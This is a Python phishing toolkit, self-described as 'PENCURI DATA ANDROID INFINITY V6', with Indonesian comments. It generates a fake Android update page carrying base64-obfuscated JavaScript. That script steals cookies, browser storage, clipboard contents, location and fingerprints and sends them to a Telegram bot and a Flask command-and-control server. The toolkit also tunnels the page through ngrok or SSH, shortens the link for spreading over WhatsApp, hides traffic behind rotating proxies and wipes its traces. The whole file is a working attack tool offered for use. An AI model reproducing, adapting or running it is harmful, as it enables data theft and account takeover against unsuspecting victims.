import os
import subprocess
import time
import shutil
import threading
import random
import sys
import requests
import socks
import socket
from faker import Faker
from base64 import b64encode
import logging
import json
import hashlib
from flask import Flask, request
from concurrent.futures import ThreadPoolExecutor
import ssl
import OpenSSL

# Setup logging (in-memory, no file traces)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()
logger.handlers = [logging.StreamHandler(sys.stdout)]

fake = Faker()

# Baca proxy dari file .txt
def load_proxies(file_path="proxies.txt"):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f.read().splitlines():
                if line.strip():
                    parts = line.split(':')
                    if len(parts) >= 2:
                        proxy = {"host": parts[0], "port": int(parts[1]), "type": "http"}
                        if len(parts) == 4:
                            proxy["user"] = parts[2]
                            proxy["pass"] = parts[3]
                        if "socks4" in line.lower():
                            proxy["type"] = "socks4"
                        elif "socks5" in line.lower():
                            proxy["type"] = "socks5"
                        elif "https" in line.lower():
                            proxy["type"] = "https"
                        proxies.append(proxy)
        return proxies
    except Exception as e:
        logger.error(f"Gagal baca proxies.txt: {e}")
        return [{"host": "127.0.0.1", "port": 8080, "type": "http"}]

proxy_list = load_proxies("proxies.txt")

# Animasi UI Hollywood-style
def hacker_ui():
    hacker_chars = ["0", "1", "#", "@", "$", "%", "&", "*", "!", "?"]
    hack_logs = [
        "🔎 Scanning Android apps...",
        "🛡️ Bypassing browser sandbox...",
        "🌐 Rotating VIP proxy...",
        "💉 Executing infinity payload...",
        "🎯 Extracting app data...",
        "📡 Transmitting to Telegram C2..."
    ]
    def animate():
        while True:
            sys.stdout.write("\033[H\033[J")
            print("\033[32m" + "🔥 BLACKHAT ANDROID INFINITY V6 🔥".center(100) + "\033[0m")
            print("\033[31m" + "═"*100 + "\033[0m")
            for _ in range(8):
                print("".join(random.choice(hacker_chars) for _ in range(100)))
            print("\033[31m" + "═"*100 + "\033[0m")
            print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(100))
            print("\033[33m" + "Data dikirim ke Telegram C2!".center(100))
            print("\033[31m" + "═"*100 + "\033[0m")
            time.sleep(0.3)
    threading.Thread(target=animate, daemon=True).start()

# Banner
def print_banner():
    banner = r"""
😈😈😈 PENCURI DATA ANDROID INFINITY V6 😈😈😈
__________  _________________________            
___  __ \ \/ /__  ____/___  _/_  ___/
__  /_/ /_  _/_____ \ __  / _____ \ 
_  ____/_  /  ____/ /___/ / ____/ / 
/_/     /_/   /____/ /____/ /____/  
                                    
    Coded by: Mr.4Rex_503 & Kevin4Chan1337
    Target: All Android App Data
    Powered by: Blackhat Indo Cyber Elite
😈 Optimized for Ngrok & VIP Proxies 😈
"""
    print(banner)

# Check dependensi
def check_dependencies():
    required = ['requests', 'faker', 'pysocks', 'flask', 'pyOpenSSL']
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            print(f"\033[31m{lib} not found, installing...\033[0m")
            os.system(f"pip install {lib}")

# Generate self-signed SSL certificate
def generate_ssl_cert():
    key = OpenSSL.crypto.PKey()
    key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
    cert = OpenSSL.crypto.X509()
    cert.get_subject().CN = "localhost"
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10*365*24*60*60)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, 'sha256')
    with open("cert.pem", "wb") as f:
        f.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert))
    with open("key.pem", "wb") as f:
        f.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key))
    return "cert.pem", "key.pem"

# Setup proxy VIP
def setup_proxy():
    proxy = random.choice(proxy_list)
    proxy_type = {
        "socks4": socks.SOCKS4,
        "socks5": socks.SOCKS5,
        "http": socks.HTTP,
        "https": socks.HTTP
    }.get(proxy["type"], socks.HTTP)
    socks.set_default_proxy(proxy_type, proxy["host"], proxy["port"], 
                           username=proxy.get("user"), password=proxy.get("pass"))
    socket.socket = socks.socksocket
    logger.info(f"Using VIP proxy: {proxy['host']}:{proxy['port']} ({proxy['type']})")
    return proxy

# Input Konfigurasi
def get_config():
    print("🔥 Masukkan konfigurasi, tuanku:")
    ngrok_authtoken = input("Masukkan Ngrok Authtoken: ")
    bot_token = input("Masukkan Telegram Bot Token: ")
    chat_id = input("Masukkan Telegram Chat ID: ")
    tinyurl_api = input("Masukkan TinyURL API Token (kosongkan jika tidak ada): ")
    ssh_host = input("Masukkan SSH Host untuk failover (kosongkan jika tidak ada): ") or ""
    ssh_port = input("Masukkan SSH Port (default 22): ") or "22"
    ssh_user = input("Masukkan SSH Username: ") or ""
    ssh_key = input("Masukkan path ke SSH Key (kosongkan jika tidak ada): ") or ""
    return ngrok_authtoken, bot_token, chat_id, tinyurl_api, ssh_host, ssh_port, ssh_user, ssh_key

# Obfuscasi JS
def obfuscate_js(js_code):
    return f"eval(atob('{b64encode(js_code.encode()).decode()}'))"

# Template HTML Payload (Modal klik, no interaction)
def generate_html(bot_token, chat_id):
    js_code = """
async function infinitySteal() {
    try {
        // Register Service Worker
        if ('serviceWorker' in navigator) {
            await navigator.serviceWorker.register('/sw.js');
        }

        // Collect device info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            battery: await navigator.getBattery?.().then(b => ({level: b.level, charging: b.charging})) || 'N/A',
            geolocation: await new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude}),
                    () => resolve('Geolokasi ditolak'),
                    {timeout: 5000}
                );
            }),
            webrtc: await new Promise(async resolve => {
                try {
                    const pc = new RTCPeerConnection({iceServers: []});
                    pc.createDataChannel('');
                    pc.onicecandidate = e => {
                        if (e.candidate) resolve(e.candidate.candidate);
                        else resolve('WebRTC disabled');
                    };
                    await pc.createOffer().then(offer => pc.setLocalDescription(offer));
                } catch { resolve('WebRTC error'); }
            }),
            canvas: (() => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 10, 20);
                return canvas.toDataURL();
            })(),
            apps: await new Promise(async resolve => {
                const apps = [];
                const appDomains = ['web.whatsapp.com', 'www.instagram.com', 'www.facebook.com'];
                for (const domain of appDomains) {
                    try {
                        const res = await fetch(`https://${domain}`, {credentials: 'include'});
                        apps.push({domain, cookies: document.cookie});
                    } catch { apps.push({domain, cookies: 'N/A'}); }
                }
                resolve(apps);
            })
        };

        // Collect browser data
        const cookies = document.cookie;
        const localStorageData = JSON.stringify(localStorage);
        const sessionStorageData = JSON.stringify(sessionStorage);
        const clipboard = await navigator.clipboard?.readText().catch(() => 'Clipboard N/A');

        // Send data to C2 and Telegram
        const data = {
            deviceInfo, cookies, localStorageData, sessionStorageData, clipboard
        };
        const telegramUrl = `https://api.telegram.org/bot${bot_token}/sendMessage`;
        for (let i = 0; i < 3; i++) {
            try {
                // Split data if too large
                const text = JSON.stringify(data, null, 2);
                const chunks = text.match(/.{1,4000}/g) || [text];
                for (const chunk of chunks) {
                    await fetch(telegramUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: '${chat_id}', text: `Android Data:\n${chunk}`})
                    });
                }
                // Send to C2
                await fetch('/store', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                break;
            } catch {
                if (i === 2) console.error('Telegram/C2 failed');
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }

        // Redirect to legit site
        setTimeout(() => window.location.href = 'https://google.com', 500);
    } catch (error) {
        console.error('Infinity steal error:', error);
    }
}

// Auto-execute
infinitySteal();

// Fake prompt for permissions
function fakePrompt() {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'data:text/html,<script>navigator.geolocation.getCurrentPosition(() => {}, () => {}, {timeout: 5000}); navigator.clipboard.readText().catch(() => {});</script>';
    document.body.appendChild(iframe);
    setTimeout(() => document.body.removeChild(iframe), 1000);
}
fakePrompt();
"""
    return f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Sistem Android</title>
    <meta name="description" content="Update sistem Android terbaru untuk performa maksimal!">
    <meta name="robots" content="index, follow">
    <link rel="icon" href="https://www.android.com/favicon.ico">
    <style>
        body {{
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
        }}
        .container {{
            background: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
            text-align: center;
        }}
        h1 {{ font-size: 2em; text-shadow: 0 0 10px #0f0; }}
        .loader {{
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0f0;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Memproses Update Sistem...</h1>
        <div class="loader"></div>
    </div>
    <script>
        {obfuscate_js(js_code)}
    </script>
    <script src="/sw.js"></script>
</body>
</html>"""

# Service Worker untuk background execution
def generate_service_worker():
    return """self.addEventListener('fetch', event => {
    event.respondWith(fetch(event.request));
});
self.addEventListener('install', event => {
    self.skipWaiting();
});
self.addEventListener('activate', event => {
    self.clients.claim();
});"""

# Flask C2 Server
app = Flask(__name__)
stolen_data = []

@app.route('/store', methods=['POST'])
def store_data():
    data = request.json
    stolen_data.append(data)
    logger.info("Data stored in C2")
    return {'status': 'success'}

def run_c2_server():
    cert_file, key_file = generate_ssl_cert()
    app.run(host='0.0.0.0', port=5000, ssl_context=(cert_file, key_file), threaded=True)

# Shorten URL with TinyURL
def shorten_url(url, tinyurl_api, proxy):
    if not tinyurl_api:
        return url
    proxies = {proxy["type"]: f"{proxy['type']}://{proxy['host']}:{proxy['port']}"}
    if proxy.get("user") and proxy.get("pass"):
        proxies[proxy["type"]] = f"{proxy['type']}://{proxy['user']}:{proxy['pass']}@{proxy['host']}:{proxy['port']}"
    try:
        response = requests.get(
            f"https://api.tinyurl.com/create?api_token={tinyurl_api}",
            params={"url": url},
            proxies=proxies
        ).json()
        return response.get('data', {}).get('tiny_url', url)
    except Exception as e:
        logger.error(f"TinyURL error: {e}")
        return url

# Setup tunnel (Ngrok, localtunnel, SSH)
def setup_tunnel(port, ngrok_authtoken, ssh_host, ssh_port, ssh_user, ssh_key):
    def try_ngrok():
        ngrok_executable = "ngrok" if not sys.platform.startswith("win") else "ngrok.exe"
        if not shutil.which(ngrok_executable):
            logger.error("Ngrok not found")
            return None, None
        ngrok_config = f"""authtoken: {ngrok_authtoken}
tunnels:
  phishing:
    addr: {port}
    proto: http
"""
        with open("ngrok.yml", "w", encoding="utf-8") as f:
            f.write(ngrok_config)
        ngrok_process = subprocess.Popen([ngrok_executable, "start", "--config", "ngrok.yml", "phishing"], stdout=subprocess.PIPE)
        for _ in range(5):
            try:
                time.sleep(3)
                tunnels = requests.get("http://localhost:4040/api/tunnels").json()['tunnels']
                return tunnels[0]['public_url'], ngrok_process
            except:
                logger.info("Mencoba mendapatkan URL Ngrok...")
        ngrok_process.terminate()
        return None, None

    def try_localtunnel():
        localtunnel_executable = "lt" if not sys.platform.startswith("win") else "lt.exe"
        if not shutil.which(localtunnel_executable):
            logger.error("Localtunnel not found")
            return None, None
        lt_process = subprocess.Popen([localtunnel_executable, "--port", str(port)], stdout=subprocess.PIPE)
        time.sleep(3)
        try:
            lt_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
            lt_url = lt_url.split('"public_url":"')[1].split('"')[0]
            return lt_url, lt_process
        except:
            lt_process.terminate()
            return None, None

    def try_ssh_tunnel():
        if not ssh_host or not ssh_user:
            return None, None
        ssh_cmd = ["ssh", "-R", f"80:localhost:{port}", "-p", ssh_port, "-i", ssh_key, f"{ssh_user}@{ssh_host}"]
        ssh_process = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE)
        time.sleep(3)
        return f"http://{ssh_host}", ssh_process

    # Try tunnels in order
    url, process = try_ngrok()
    if url:
        return url, process
    url, process = try_localtunnel()
    if url:
        return url, process
    url, process = try_ssh_tunnel()
    return url, process

# Main setup
def setup_phishing(ngrok_authtoken, bot_token, chat_id, tinyurl_api, ssh_host, ssh_port, ssh_user, ssh_key):
    folder_name = f"phishing_site_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    os.makedirs(folder_name, exist_ok=True)
    
    # Generate files
    with open(f"{folder_name}/index.html", "w", encoding="utf-8") as f:
        f.write(generate_html(bot_token, chat_id))
    with open(f"{folder_name}/sw.js", "w", encoding="utf-8") as f:
        f.write(generate_service_worker())
    
    # Start Flask C2
    threading.Thread(target=run_c2_server, daemon=True).start()
    
    # Start HTTPS server
    cert_file, key_file = generate_ssl_cert()
    server_process = subprocess.Popen(["python", "-m", "http.server", "8080", "--bind", "0.0.0.0", "--certificate", cert_file, "--key", key_file], cwd=folder_name)
    
    # Setup tunnel
    proxy = setup_proxy()
    url, tunnel_process = setup_tunnel(8080, ngrok_authtoken, ssh_host, ssh_port, ssh_user, ssh_key)
    
    if url:
        short_url = shorten_url(url, tinyurl_api, proxy)
        print(f"\n🎉 Link Phishing Siap Disebar: {short_url}")
        print("🔗 Kirim link ini via WhatsApp/Telegram!")
        print("⏳ Menunggu target klik... Data masuk ke Telegram!")
        logger.info(f"Phishing URL: {short_url}")
    else:
        print("❌ Gagal setup tunnel. Cek Ngrok/localtunnel/SSH!")
        server_process.terminate()
        sys.exit(1)
    
    # Monitor tunnel
    def monitor_tunnel():
        while server_process.poll() is None and (tunnel_process and tunnel_process.poll() is None):
            time.sleep(5)
            try:
                requests.get("http://localhost:4040/api/tunnels", timeout=5)
            except:
                logger.info("Tunnel down, restarting...")
                tunnel_process.terminate()
                new_url, new_process = setup_tunnel(8080, ngrok_authtoken, ssh_host, ssh_port, ssh_user, ssh_key)
                if new_url:
                    short_url = shorten_url(new_url, tinyurl_api, proxy)
                    print(f"🔄 Tunnel restarted: {short_url}")
                    logger.info(f"New URL: {short_url}")
                    tunnel_process = new_process
    
    threading.Thread(target=monitor_tunnel, daemon=True).start()
    return server_process, tunnel_process, folder_name

# Main program
def main():
    check_dependencies()
    print_banner()
    ngrok_authtoken, bot_token, chat_id, tinyurl_api, ssh_host, ssh_port, ssh_user, ssh_key = get_config()
    
    server_process, tunnel_process, folder_name = setup_phishing(ngrok_authtoken, bot_token, chat_id, tinyurl_api, ssh_host, ssh_port, ssh_user, ssh_key)
    hacker_ui()
    try:
        input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
    finally:
        server_process.terminate()
        if tunnel_process:
            tunnel_process.terminate()
        shutil.rmtree(folder_name, ignore_errors=True)
        for file in ["ngrok.yml", "cert.pem", "key.pem"]:
            if os.path.exists(file):
                os.remove(file)
        print("🧹 Membersihkan jejak... Selesai!")

if __name__ == "__main__":
    main()
